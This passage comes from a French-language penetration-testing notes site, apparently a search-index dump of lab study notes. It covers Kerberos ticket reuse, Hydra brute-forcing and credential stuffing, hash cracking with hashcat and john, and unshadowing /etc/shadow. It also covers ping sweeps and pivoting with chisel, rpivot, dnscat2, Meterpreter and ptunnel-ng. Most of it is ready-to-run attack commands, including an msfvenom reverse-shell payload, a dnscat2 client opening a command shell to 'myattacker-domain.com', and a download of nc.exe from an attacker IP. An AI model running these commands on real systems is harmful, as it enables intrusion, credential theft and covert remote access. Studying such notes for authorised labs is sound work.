Agent d'Invoke-WebRequest\nInvoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"C:\\Users\\Public\\nc.exe\"\n</code></pre>"},{"location":"_Techniques/Evasion/Web%20Application%20Firewall%20bypass/","title":"Web Application Firewall bypass","text":"<p>WAF Bypass : https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/</p>"},{"location":"_Techniques/Linux/Authentification%20Kerberos/","title":"Authentification Kerberos","text":"<p>On peut utiliser la commande <code>realm</code> pour avoir des informations sur l'authentification kerberos configur\u00e9e sur une machine linux.</p> <p>Un fichier keytab contient les cl\u00e9s li\u00e9es \u00e0 un compte utlisateur pour r\u00e9aliser des authentification kerberos (demande de TGT)</p> <p>Un fichier CCACHE est contient un ou plusieurs tickets kerberos.</p> <p>Lorsqu'on trouve un fichier keytab et que l'on connait le nom d'utilisateur qui lui est associ\u00e9 (en utilisant par exemple KeyTab Extract,</p>"},{"location":"_Techniques/Linux/Authentification%20Kerberos/#trouver-des-fichiers-keytab-et-ccache","title":"Trouver des fichiers keytab et CCACHE","text":"<p>Par d\u00e9faut les fichiers <code>CCACHE</code> sont enregistr\u00e9s dans <code>/tmp</code> mais seul l'utilisateur root peut y acc\u00e9der</p>"},{"location":"_Techniques/Linux/Authentification%20Kerberos/#utilisation-dun-keytab","title":"Utilisation d'un Keytab","text":"<p>on peut utiliser le fichier Keytab \u00e0 l'aide de <code>kinit</code> :</p> <pre><code># cr\u00e9ation d'un TGT \u00e0 partir d'un keytab\nkinit user@realm -k -t /chemin/vers/fichier.keytab # le ticket g\u00e9n\u00e9r\u00e9 est stock\u00e9 dans le CCACHE courant ou un CCACHE est cr\u00e9\u00e9 (dans /tmp)\n                                        # la variable KRB5CCNAME prend la valeur du fichier CCACHE si cela n'\u00e9tait pas d\u00e9ja le cas\n# v\u00e9rification des tickets disponibles\nklist\n\n# utilisation par exemple de smbclient\nsmbclient -k -no-pass //SRV/Share -c 'ls'\n</code></pre>"},{"location":"_Techniques/Linux/Authentification%20Kerberos/#utilisation-dun-ccache","title":"Utilisation d'un CCACHE","text":"<p>Si on arrive \u00e0 lire un CCACHE, on peut l'utiliser :</p> <pre><code>export KRB5CCNAME=/Path/to/Fichier.CCACHE\n\n# Exemples d'utilisation\nsmbclient -k -no-pass //SRV/Share -c 'ls'\n\npsexec.py  FQDN.domain.local -k -no-pass\n\n## ATTENTION : cme n'utilise $KRB5CCNAME que si on utilise --use-kcache\ncrackmapexec smb dc01.inlanefreight.htb -k --use-kcache --shares\n\n\n# Evil-WinRM (n\u00e9cessite d'ajouter une entr\u00e9e vers le KDC (voir -h))\nproxychains evil-winrm -i FQDN.domain.local -r 'domain.local'\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Bruteforcer%20un%20service/","title":"Bruteforcer un service","text":""},{"location":"_Techniques/Mots%20de%20passe/Bruteforcer%20un%20service/#sans-connaitre-un-identifiant-ou-mot-de-passe","title":"Sans connaitre un identifiant ou mot de passe","text":""},{"location":"_Techniques/Mots%20de%20passe/Bruteforcer%20un%20service/#comptes-par-defaut-ou-tres-frequemment-utilises","title":"Comptes par d\u00e9faut ou tr\u00e8s fr\u00e9quemment utilis\u00e9s","text":"<p>Selon le service \u00e0 attaquer, on pourra utiliser hydra avec le param\u00e8tre <code>-C</code> et fournir un dictionnaire (wordlist) contenant des couples <code>utilisateur:mot_de_passe</code> s\u00e9par\u00e9s par un <code>:</code></p> <p>Plusieures wordlist de ce type sont disponibles dans <code>/usr/share/seclists/Passwords/Default-Credentials/</code> (notamment <code>ftp-betterdefaultpasslist.txt</code>)</p>"},{"location":"_Techniques/Mots%20de%20passe/Bruteforcer%20un%20service/#tenter-des-utilisateurs-et-mots-de-passe-communs","title":"Tenter des utilisateurs et mots de passe communs","text":""},{"location":"_Techniques/Mots%20de%20passe/Bruteforcer%20un%20service/#liste-de-comptes-utilisateurs","title":"Liste de comptes utilisateurs","text":"<p>On</p> <pre><code>hydra -l user -P passlist.txt ftp://192.168.0.1\nhydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN\n\n# credential stuffing\nhydra -C user_pass.list ssh://$TARGET_IP\nhydra -l admin -p password ftp://[192.168.0.0/24]/\nhydra -L logins.txt -P pws.txt -M targets.txt ssh\n\n# bruteforce mail service password for known user\nhydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP smtp -t 64  \nhydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP pop3 -t 64 \nhydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP imap -t 64 \n</code></pre> <p>Plus d'exemple d'utilisation de l'outil : [[Hydra]]</p>"},{"location":"_Techniques/Mots%20de%20passe/Choisir%20une%20Wordlist/","title":"Choisir une Wordlist","text":"<p>Article int\u00e9ressant comparant le contenu des wordlist : https://blog.sec-it.fr/en/2021/03/02/web-wordlists/</p> <p>Lorsqu'on ne connait ni le bon nom d'utilisateur, ni le mot de passe on pourra utiliser des wordlist combinant les couples utilisateur / mot de passe les plus connus (on utilisera l'option <code>-C wordlist.txt</code> avec [[Hydra]])</p> <pre><code>Seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \n</code></pre> <p>Wordlist tr\u00e8s courte pour tester des mots de passe communs : <code>/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt</code></p>"},{"location":"_Techniques/Mots%20de%20passe/G%C3%A9n%C3%A9rer%20une%20Wordlist/","title":"G\u00e9n\u00e9rer une Wordlist","text":""},{"location":"_Techniques/Mots%20de%20passe/G%C3%A9n%C3%A9rer%20une%20Wordlist/#generer-un-dictionnaire-a-partir-de-permutations-dune-dictionnaire-existant","title":"G\u00e9n\u00e9rer un dictionnaire \u00e0 partir de permutations d'une dictionnaire existant","text":"<p>On pourra utiliser les r\u00e8gles de Hashcat pour cela : [[docs/_Techniques/Mots de passe/Casser un mot de passe/Hashcat]]</p> <p>On pourra \u00e9galement utiliser l'utilitaire https://github.com/digininja/CeWL</p> <pre><code># -d : profondeur de liens (depth) r\u00e9alis\u00e9 par le scan du bot\n# -m : longueur minimale des mots extraits des pages\ncewl https://www.company.com -d 2 -m 7 --lowercase -w inlane.wordlist\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/G%C3%A9n%C3%A9rer%20une%20Wordlist/#generer-une-liste-dutilisateurs","title":"G\u00e9n\u00e9rer une liste d'utilisateurs","text":"<p>On pourra g\u00e9n\u00e9rer, \u00e0 partir de nom / pr\u00e9noms collect\u00e9s une liste de compte utilisateurs potentiels.</p> <p>L'outil Username Anarchy offre notamment cette possibilit\u00e9</p> <pre><code>./username-anarchy John doe  # genere une liste pour cette utilisateur\nusername-anarchy -i ./osint_users.txt # meme chose pour une liste de users\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/G%C3%A9n%C3%A9rer%20une%20Wordlist/#creer-une-wordlist-personnalisee","title":"Cr\u00e9er une wordlist personnalis\u00e9e","text":"<p>L'utilitaire <code>cupp</code> permet de g\u00e9n\u00e9rer une wordlist \u00e0 partir d'informations concernant un utilisateur (date de naissance, noms des enfants, etc.).</p>"},{"location":"_Techniques/Mots%20de%20passe/G%C3%A9n%C3%A9rer%20une%20Wordlist/#filtrage-dune-wordlist-en-fonction-dune-politique-de-mot-de-passe","title":"Filtrage d'une wordlist en fonction d'une politique de mot de passe","text":"<p>Lorsque l'on connait la politique de mot de passe, on peut \"nettoyer\" une wordlist existante afin de ne conserver que les mots de passe respectant la politique de mots de passe :</p> <pre><code>sed -ri '/^.{,7}$/d' wordlist.txt            # remove shorter than 8\nsed -ri '/[!-/:-@\\[-`\\{-~]+/!d' wordlist.txt # remove no special chars\nsed -ri '/[0-9]+/!d' wordlist.txt            # remove no numbers\nsed -ri '/[A-Z]+/!d' wordlist.txt            # remove no uppercases\nsed -ri '/[a-z]+/!d' wordlist.txt            # remove no lowercases\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Mots%20de%20passe%20par%20d%C3%A9faut/","title":"Mots de passe par d\u00e9faut","text":"<pre><code>$ pip3 install defaultcreds-cheat-sheet\n$ creds search tomcat\n</code></pre> <pre><code># Cheatsheet de mot de passes par d\u00e9faut \nhttps://github.com/ihebski/DefaultCreds-cheat-sheet\n\n# Mots de passe par d\u00e9faut routeurs\nhttps://www.softwaretestinghelp.com/default-router-username-and-password-list/\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Password%20Spraying/","title":"Password Spraying","text":"<pre><code># crowbar\ncrowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'\n\n# cme\n\n# hydra\nhydra -L usernames.txt -p 'password123' 192.168.2.143 rdp\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/Bitlocker/","title":"Bitlocker","text":"<p>Exemple pour un fichier VHD qui est chiffr\u00e9 par bitlocker :</p> <pre><code>bitlocker2john -i Backup.vhd &gt; backup.hashes\ngrep \"bitlocker\\$0\" backup.hashes &gt; backup.hash\njohn backup.hash -w=resources/mutated.list\n</code></pre> <p>On peut ensuite monter directement le VHD en double cliquant sur le VHD dans l'explorateur Windows.</p>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/En%20Ligne/","title":"En Ligne","text":"<p>https://crackstation.net/</p>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/Hashcat/","title":"Hashcat","text":""},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/Hashcat/#fichier-de-regles-de-permutations-word-mangling","title":"Fichier de r\u00e8gles de permutations (Word Mangling)","text":"<p>Les symboles suivants peuvent \u00eatre utilis\u00e9s pour r\u00e9aliser des modifications \u00e0 partir d'un mot initialement pr\u00e9sent dans un dictionnaire (wordlist).</p>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/Hashcat/#fonctions-de-transformation","title":"Fonctions de transformation","text":"<ul> <li><code>:</code> : ne fait rien (g\u00e8n\u00e8re le mot tel qu'il est pr\u00e9sent dans le dictionnaire</li> <li><code>l</code> : met en minuscule toutes les lettres (lowercase)</li> <li><code>u</code> : met en majuscule toutes les lettres (uppercase)</li> <li><code>c</code> : met en majuscule le premier caract\u00e8re et en minuscule le reste (capitalize)</li> <li><code>sXY</code> : remplace X par Y (exemple : sa@)</li> <li><code>$!</code> : ajoute un point d'exclamation \u00e0 la fin du mot</li> </ul>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/Hashcat/#exemple-de-regles","title":"Exemple de r\u00e8gles","text":"<pre><code>:               &lt;=== LeMotDorigine\nc               &lt;=== Lemotdorigine\nso0             &lt;=== LeM0tD0rigine\nc so0           &lt;=== Lem0td0rigine\n$!              &lt;=== LeMotDorigine!\n$! c            &lt;=== Lemotdorigine!\n$! so0          &lt;=== Lem0td0rigine!\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/Hashcat/#utilisation-des-regles-pour-generer-une-nouvelle-wordlist","title":"Utilisation des r\u00e8gles pour g\u00e9n\u00e9rer une nouvelle wordlist","text":"<pre><code>hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/Hashcat/#cassages-de-hash-communs","title":"Cassages de hash communs","text":"<pre><code># Hash NT\nhashcat -m 1000 -a 0 hashes rockyou.txt\n\n# Hash SHA-512 ($6$ commun dans /etc/passwd)\nhashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked\n\n\n#                                 |             ICI                |\n# Hash LM       (Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::)\nhashcat -m 3000 hash.txt rockyou.txt\n\n#                                                                  |             ICI                |\n# Hash NT       (Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::)\nhashcat -m 1000 hash.txt rockyou.txt\n\n\n# Hash NetNTLMv2\nhashcat -m 5600 hash.txt rockyou.txt\n\n# Hash de TGS  (kerberoasting)   $krb5tgs$23$*user1$DOMAIN...\nhashcat -m 13100 hash.txt rockyou.txt\n</code></pre> <p>En cas de format de fichier Hash incorrecte, se r\u00e9f\u00e9rer \u00e0  la liste des hash qui disponible ici : https://hashcat.net/wiki/doku.php?id=example_hashes</p>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/MD5/","title":"MD5","text":"<p>Format du fichier contenant les hash</p> <pre><code>SALTED_MD5_HASH$SALT:UTILISATEUR\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/MD5/#usage-avec-john","title":"Usage avec John","text":"<pre><code>john --wordlist=wordlist -format=dynamic='md5($s.$p)' md5hashsalted\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/MD5/#usage-avec-hashcat","title":"Usage avec Hashcat","text":"<pre><code>hashcat -m 0 fichier.txt dictionnaire.txt\n</code></pre>"},{"location":"_Techniques/Mots%20de%20passe/Casser%20un%20mot%20de%20passe/Mot%20de%20passe%20Linux/","title":"Mot de passe Linux","text":"<pre><code>unshadow /etc/passwd /etc/shadow &gt; /tmp/unshadowed.hashes\nhashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked\n</code></pre>"},{"location":"_Techniques/Pivoting/Ping%20sweep/","title":"Ping sweep","text":""},{"location":"_Techniques/Pivoting/Ping%20sweep/#linux-ping","title":"Linux ping","text":"<pre><code>for i in {1..254} ;do (ping -c 1 192.168.5.$i | grep \"bytes from\" &amp;) ;done\n</code></pre>"},{"location":"_Techniques/Pivoting/Ping%20sweep/#powershell","title":"Powershell","text":"<pre><code># slow\n\n1..254 | % {\"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.15.9.$($_) -quiet)\"}\n\n# fast : Get-PingSweep -Subnet 1.2.3   \n# ATTENTION : on perd parfois des paquets : relancer plusieurs fois pour \u00eatre s\u00fbr\nfunction Get-PingSweep {\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory=$true)]\n        [string]$SubNet,\n        [switch]$ResolveName\n    )\n    $ips = 1..254 | ForEach-Object {\"$($SubNet).$_\"}\n    $ps = foreach ($ip in $ips) {\n        (New-Object Net.NetworkInformation.Ping).SendPingAsync($ip, 4000)\n        #(New-Object Net.NetworkInformation.Ping).SendPingAsync($ip, 250)\n        #[Net.NetworkInformation.Ping]::New().SendPingAsync($ip, 250) # or if on PowerShell v5\n    }\n    [Threading.Tasks.Task]::WaitAll($ps)\n    $ps.Result | Where-Object -FilterScript {$_.Status -eq 'Success' -and $_.Address -like \"$subnet*\"} |\n    Select-Object Address,Status,RoundtripTime -Unique |\n    ForEach-Object {\n        if ($_.Status -eq 'Success') {\n            if (!$ResolveName) {\n                Write-Output $_\n            } else {\n                $_ | Select-Object Address, @{Expression={ResolveIp($_.Address)};Label='Name'}, Status, RoundtripTime\n            }\n        }\n    }\n}\nGet-PingSweep -Subnet 172.16.9  \n</code></pre>"},{"location":"_Techniques/Pivoting/Ping%20sweep/#nimscan","title":"Nimscan","text":"<p>Pas vraiment utilis\u00e9 pour du simple pingsweep, mais se scanner de port est portable est assez pratique pour \u00e9num\u00e9rer depuis une machine Windows</p> <pre><code>PS C:\\temp&gt; .\\nimscan.exe  172.16.9.0/24\n    )              (\n ( /(              )\\ )\n )\\()) (      )   (()/(         )\n((_)\\  )\\    (     /(_)) (   ( /(   (\n _((_)((_)   )\\  '(_))   )\\  )(_))  )\\ )\n| \\| | (_) _((_)) / __| ((_)((_)_  _(_/(  \n| .` | | || '  \\()\\__ \\/ _| / _` || ' \\))\n|_|\\_| |_||_|_|_| |___/\\__| \\__,_||_||_|\n\n    Fast Port Scanner Written In Nim\n\n==&gt; 172.16.9.3:636 Open\n==&gt; 172.16.9.3:53 Open\n==&gt; 172.16.9.3:3269 Open\n==&gt; 172.16.9.3:445 Open\n==&gt; 172.16.9.3:139 Open\n==&gt; 172.16.9.3:593 Open\n==&gt; 172.16.9.3:3268 Open\n==&gt; 172.16.9.3:389 Open\n==&gt; 172.16.9.3:464 Open\n==&gt; 172.16.9.3:88 Open\n==&gt; 172.16.9.3:135 Open\n==&gt; 172.16.9.3:5985 Open\n==&gt; 172.16.9.3:9389 Open\n==&gt; 172.16.9.3:49677 Open\n==&gt; 172.16.9.3:49676 Open\n==&gt; 172.16.9.3:49664 Open\n==&gt; 172.16.9.3:47001 Open\n==&gt; 172.16.9.3:49698 Open\n==&gt; 172.16.9.3:49683 Open\n==&gt; 172.16.9.3:49668 Open\n==&gt; 172.16.9.3:49671 Open\n==&gt; 172.16.9.3:49665 Open\n==&gt; 172.16.9.3:49666 Open\n==&gt; 172.16.9.3:63953 Open\n==&gt; 172.16.9.25:22 Open\n\n[*] NimScan finished in: 439 Seconds\n</code></pre>"},{"location":"_Techniques/Pivoting/Trouver%20des%20hotes%20dans%20le%20r%C3%A9seau/","title":"Trouver des hotes dans le r\u00e9seau","text":"<p>Depuis une machine compromise</p>"},{"location":"_Techniques/Pivoting/Trouver%20des%20hotes%20dans%20le%20r%C3%A9seau/#via-meterpreter","title":"via Meterpreter","text":"<pre><code>meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Dnscat2/","title":"via Dnscat2","text":"<p>Cet outil offre de la furtivit\u00e9 mais cela au d\u00e9triment des performances. Il faudra l'utiliser uniquement lorsque la discr\u00e9tion est une priorit\u00e9</p>"},{"location":"_Techniques/Pivoting/via%20Dnscat2/#installation","title":"Installation","text":"<pre><code>sudo apt install dnscat2\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Dnscat2/#utilisation","title":"Utilisation","text":""},{"location":"_Techniques/Pivoting/via%20Dnscat2/#serveur","title":"Serveur","text":"<pre><code># lance le listener et affiche la ligne de commande \u00e0 lancer sur la cible\nsudo dnscat2-server --dns domain=blabla.fr\n[...]\n./dnscat --secret=9daeec39519fcba5c8a62a8b157f5e1e blabla.fr\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Dnscat2/#client","title":"Client","text":""},{"location":"_Techniques/Pivoting/via%20Dnscat2/#powershell","title":"Powershell","text":"<pre><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git\n\nImport-Module .\\dnscat2.ps1\nStart-Dnscat2 -DNSserver 1.2.3.4 -Domain myattacker-domain.com -PreSharedSecret xxxxxxxxxxxxxxxxxxxxxxxx -Exec cmd \n</code></pre> <pre><code># Sur le serveur, apres que le client se soit connect\u00e9 :\nwindow\n0 :: main [active]\n  crypto-debug :: Debug window for crypto stuff [*]\n  dns1 :: DNS Driver running on 0.0.0.0:53 domains = blabla.fr [*]\n  1 :: (not set) [cleartext] [idle for 446 seconds]\n  2 :: exec (MYHOST) [encrypted and verified] [*]     &lt;====== NOTRE SESSION\n\n# interaction\nwindow -i 2\n\n## ATTENTION : lorsque l'on saisie une commande, cela met beaucoup de temps \u00e0 retourner une r\u00e9ponse !!\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Meterpreter/","title":"via Meterpreter","text":"<ul> <li>G\u00e9n\u00e9rer un reverse shell avec [[msfvenom]]</li> <li>Apr\u00e8s avoir ex\u00e9cut\u00e9 le reverse shell et obtenu une session meterpreter :</li> </ul>"},{"location":"_Techniques/Pivoting/via%20Meterpreter/#scan-des-hotes-repondant-a-licmp-depuis-la-machine-de-rebond-pivot","title":"Scan des h\u00f4tes r\u00e9pondant \u00e0 l'ICMP depuis la machine de rebond (pivot)","text":"<pre><code>meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23\n\n[*] Performing ping sweep for IP range 172.16.5.0/23\n</code></pre> <pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.228 LPORT=2222 -f elf &gt; shell-2222.elf\n\nmsf6&gt; **use exploit/multi/handler\nset LHOST tun0\nset LPORT 2222\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nrun\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Meterpreter/#pivot-via-meterpreter","title":"Pivot via Meterpreter","text":"<pre><code># 1 - Etablir une session meterpreter\nuse exploit/multi/handler\nset LHOST tun0\nset LPORT 2222\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\n\n# 2 - lancer le serveur socks\nuse auxiliary/server/socks_proxy\nset SRVHOST 0.0.0.0\nset SRVPORT 1080\nset VERSION 4a\nrun\n\n# 3 - Connecter le socks \u00e0 notre session meterpreter (7 in the example)\nuse post/multi/manage/autoroute\nset SESSION 7\nrun\n\n# 4 - Tester avec proxychain\nproxychains nmap $TARGET_IP -p3389 -sT -v -Pn\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Meterpreter/#redirection-de-port-via-meterpreter","title":"Redirection de port via Meterpreter","text":"<pre><code>Usage: portfwd [-h] [add | delete | list | flush] [args]\n    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the \"list\" command).\n    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.\n    -L &lt;opt&gt;  Forward: local host to listen on (optional). Reverse: local host to connect to.\n    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.\n    -r &lt;opt&gt;  Forward: remote host to connect to.\n    -R        Indicates a reverse port forward.\n\n# exemple rendant accessible localhost:1234 --&gt; 1.2.3.4 depuis kali\nmeterpreter &gt; portfwd add -l 1234 -p 3389 -r 1.2.3.4\n\n# reverse port forwarding (on poura lancer un listener sur le port 1234)\nmeterpreter &gt; portfwd add -R -l 2222 -p 1234 -L &lt;ATTACKER IP&gt;\n   Traffic entrant --&gt; Meterpreter client (port 2222) --&gt; Attaquant (1234)\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Rpivot/","title":"via Rpivot","text":""},{"location":"_Techniques/Pivoting/via%20Rpivot/#installation","title":"Installation","text":"<pre><code>sudo git clone https://github.com/klsecservices/rpivot.git\nsudo apt-get install python2.7\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Rpivot/#fonctionnement","title":"Fonctionnement","text":"<p>Cet outil s'appuie sur le protocole HTTP et peut m\u00eame se connecter au proxy de l'entreprise en utilisant une authentification NTLM</p> <p>2 composants :</p> <ul> <li><code>server.py</code> \u00e0 installer sur la machine de l'attaquant : il \u00e9coute localement sur 2 ports<ul> <li>1 port sur lequel le <code>client.py</code> va se connecter</li> <li>1 port sur lequel il expose un service socks4</li> </ul> </li> <li><code>client.py</code> qui se connecte au <code>server.py</code> pour \u00e9tablir un tunnel HTTP.</li> </ul>"},{"location":"_Techniques/Pivoting/via%20Rpivot/#lancement-du-serveur","title":"Lancement du serveur","text":"<pre><code># sur la machine de l'attaquant\npython2.7 server.py --proxy-port 1080 --server-port 1234 --server-ip 0.0.0.0\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20Rpivot/#lancement-du-client","title":"Lancement du client","text":"<pre><code># depuis la cible\n# connexion simple\npython2.7 client.py --server-ip 10.10.15.213 --server-port 1234\n\n# connexion via le proxy de l'entreprise avec une authentification NTLM\npython2.7 client.py --server-ip 10.10.15.213 --server-port 1234 --ntlm-proxy-ip &lt;ProxyIP&gt; --ntlm-proxy-port 3129 --domain DOMAIN --username user --password pass\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20SocksOverRDP/","title":"via SocksOverRDP","text":""},{"location":"_Techniques/Pivoting/via%20SocksOverRDP/#sources","title":"Sources","text":"<ul> <li>https://github.com/nccgroup/SocksOverRDP/releases</li> <li>https://www.proxifier.com/download/ProxifierPE.zip</li> </ul>"},{"location":"_Techniques/Pivoting/via%20SocksOverRDP/#installation","title":"Installation","text":""},{"location":"_Techniques/Pivoting/via%20SocksOverRDP/#sur-le-client-rdp","title":"Sur le client RDP","text":"<pre><code># enregistrer la DLL de Socks Over RDP\n# ex\u00e9cuter en privil\u00e8ges \u00e9lev\u00e9s (UAC)  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   &lt;=== ATTENTION\nregsvr32 /i SocksOverRDP-Plugin.dll\n\n# Apres avoir lanc\u00e9 mstsc.exe et valid\u00e9 la connexion vers un serveur\n# une boite de dialogue confirme que la DLL est bien fonctionnelle\n\n# Une fois que la partie serveur est r\u00e9alis\u00e9e (voir paragraphe plus bas), le serveur confirmera qu'il est bien connect\u00e9.\n# A ce moment l\u00e0, on peut voir localement sur le client que le port 1080 est bien en \u00e9coute\n# On lance ensuite proxifier et on ajoute un serveur proxy de type socks 5 vers 127.0.0.1:80 \n# ATTENTION : il faut lancer profixy en tant qu'administrateur (ATTENTION si on ferme l'application elle se minimise!)\n\n# on peut ensuite lancer un nouveau MSTSC.exe et le traffic est achemin\u00e9 au travers du proxy socks.\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20SocksOverRDP/#sur-le-serveur-rdp-distant-pivot","title":"Sur le serveur RDP distant (pivot)","text":"<pre><code># Lancer ensuite le serveur  (SocksOverRDP-Server.exe)\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20chisel/","title":"Via chisel","text":""},{"location":"_Techniques/Pivoting/via%20chisel/#installation-et-reduction-de-la-taille","title":"Installation et r\u00e9duction de la taille","text":"<pre><code>git clone https://github.com/jpillora/chisel.git\ncd chisel\n# stripping\ngo build -ldflags=\"-s -w\"  # r\u00e9duction de 10 Mo \u00e0 6 Mo\n# sinon \"static linking\" (rend plus portable mais plus gros)\ngo build -gccgoflags=\"-s -w --static\"\n# compression\nupx brute chisel # r\u00e9duction de 6 \u00e0 1.5Mo\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20chisel/#attackbox","title":"Attackbox","text":"<p>On commence par lancer un serveur sur notre machine (on veut que le client chisel se connecte \u00e0 nous car en g\u00e9n\u00e9ral les connexions sortantes sont autoris\u00e9es mais pas le contraire. C'est un peu l'\u00e9quivalent du c\u00f4t\u00e9 \"reverse\" d'un reverse shell)</p> <pre><code>chisel server -p 443 --reverse\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20chisel/#cible","title":"Cible","text":"<p>On lance chisel en mode client (pour qu'il se connecte \u00e0 notre serveur).</p> <p>Une fois lanc\u00e9, on souhaite qu'il ex\u00e9cute un serveur socks5.</p> <p>En principe, un serveur socks s'ex\u00e9cute c\u00f4t\u00e9 serveur, mais dans notre cas, on souhaite que le serveur socks s'ex\u00e9cute sur notre cible (donc c\u00f4t\u00e9 client).</p> <p>On utilisera pour ce faire le <code>R</code> qui signifit \"reverse\" pour inverser le sens du tunnel.</p> <p>On aura donc un serveur socks qui s'ex\u00e9cutera sur notre client et qui sera accessible depuis notre serveur sur un port qui, par d\u00e9faut, sera le 1080.</p> <pre><code># \u00e9coutera sur le port par d\u00e9faut (1080) du serveur (attaquant) \nchisel client &lt;ATTACK_BOX_IP&gt;:443 R:socks\n\n# si on souhaite modifier le port par d\u00e9faut :\nchisel client &lt;ATTACK_BOX_IP&gt;:443 R:socks:1234\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20chisel/#utilisation","title":"Utilisation","text":"<p>On se connectera en utlisant <code>proxychain</code>.</p> <p>On commence par modifier le fichier de configuration <code>/etc/proxychains4.conf</code> et ajouter \u00e0 la fin la section :</p> <pre><code>[ProxyList]\nsocks5 127.0.0.1 1080\n# on peut \u00e9ventuellement chainer les proxy socks sur lesquels rebondir en ajouter d'autres lignes \u00e0 la suite\n</code></pre> <p>Une fois configur\u00e9, il ne reste plus qu'\u00e0 pr\u00e9fixer nos commandes favorites de <code>proxychain</code> :</p> <pre><code># Connexion SSH via le tunnel socks\nproxychains ssh user@&lt;IP_HOTE_ACCESSIBLE_DANS_LE_LAN_DE_NOTRE_CIBLE&gt;\n</code></pre> <pre><code>chisel server -p 443 --reverse\n\nssh webadmin@$TARGET_IP -i loot/id_rsa1 -D 1080  -R 1234:0.0.0.0:443 -v   \n</code></pre>"},{"location":"_Techniques/Pivoting/via%20netsh/","title":"Via netsh","text":"<pre><code># configuration d'une redirection de port\nC:\\Windows\\system32&gt; netsh.exe interface portproxy add v4tov4 listenport=1234 listenaddress=10.10.15.2 connectport=3389 connectaddress=192.168.2.100\n\n# v\u00e9rification\nnetsh.exe interface portproxy show v4tov4\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20ptunnel-ng/","title":"Via ptunnel ng","text":"<p>Cet outil utilise des requ\u00eates ICMP echo et reply pour \u00e9tablir un tunnel entre le client et le serveur.</p> <p>Il expose un port local du serveur au travers du tunnel.</p> <p>Si l'on souhaite disposer d'un proxy socks, il faudra d'abord exposer un service ssh par exemple, puis s'y connecter au travers du tunnel avec l'option <code>-D</code></p>"},{"location":"_Techniques/Pivoting/via%20ptunnel-ng/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/utoni/ptunnel-ng.git\ncd ptunnel-ng\nsudo ./autogen.sh \n</code></pre>"},{"location":"_Techniques/Pivoting/via%20ptunnel-ng/#utilisation","title":"Utilisation","text":""},{"location":"_Techniques/Pivoting/via%20ptunnel-ng/#etablissement-du-tunnel-icmp","title":"Etablissement du tunnel ICMP","text":"<p>On ex\u00e9cute le serveur sur la cible et le client sur la machine de l'attaquant.</p> <p>On commence par exposer le service SSH (port 22) s'ex\u00e9cutant sur la cible dont l'IP est <code>$PIVOT_IP</code></p> <pre><code># ex\u00e9cution du serveur sur la cible\n\nsudo ./ptunnel-ng -r -R22 \n# ou\nsudo ./ptunnel-ng --remote-addr --remote-port22 \n</code></pre> <p>On se connecte ensuite au serveur depuis la machine de l'attaquant. On cr\u00e9e un listener sur le port 